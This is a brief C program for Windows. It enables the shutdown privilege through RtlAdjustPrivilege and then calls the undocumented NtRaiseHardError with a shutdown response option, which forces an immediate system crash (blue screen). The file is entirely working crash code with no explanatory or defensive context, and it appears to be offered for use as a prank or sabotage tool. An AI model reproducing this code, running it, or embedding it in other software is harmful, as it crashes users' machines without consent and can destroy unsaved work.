#include <windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnocodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponceOption, PULONG Responce);

int main() {
    BOOLEAN bl;
    unsigned long responce;
	
    RtlAdjustPrivilege(19, true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &responce);

    return 0;
}
